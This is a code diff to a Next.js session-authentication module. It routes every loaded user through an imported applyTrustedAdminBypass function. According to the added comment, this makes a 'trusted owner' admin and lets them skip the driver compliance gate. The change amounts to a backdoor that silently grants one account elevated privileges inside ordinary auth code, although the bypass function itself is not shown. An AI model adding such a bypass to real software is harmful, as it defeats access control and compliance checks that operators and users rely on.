@@ -1,6 +1,6 @@
 import { cookies, headers } from 'next/headers';
 import { SignJWT, jwtVerify } from 'jose';
-import { findUserById, type User } from './db';
+import { applyTrustedAdminBypass, findUserById, type User } from './db';
 
 function authSecretBytes(): Uint8Array {
   const raw =
@@ -33,8 +33,10 @@ async function userFromSessionToken(token: string): Promise<User | null> {
     const { payload } = await jwtVerify(token, authSecretBytes());
     const userId = payload.sub;
     if (typeof userId !== 'string') return null;
-    const user = await findUserById(userId);
-    if (!user) return null;
+    const raw = await findUserById(userId);
+    if (!raw) return null;
+    const user = applyTrustedAdminBypass(raw);
+    // Trusted owner always passes the driver gate after bypass (role becomes admin).
     if (user.role === 'driver' && user.driver_status !== 'active_compliant') return null;
     return user;
   } catch {
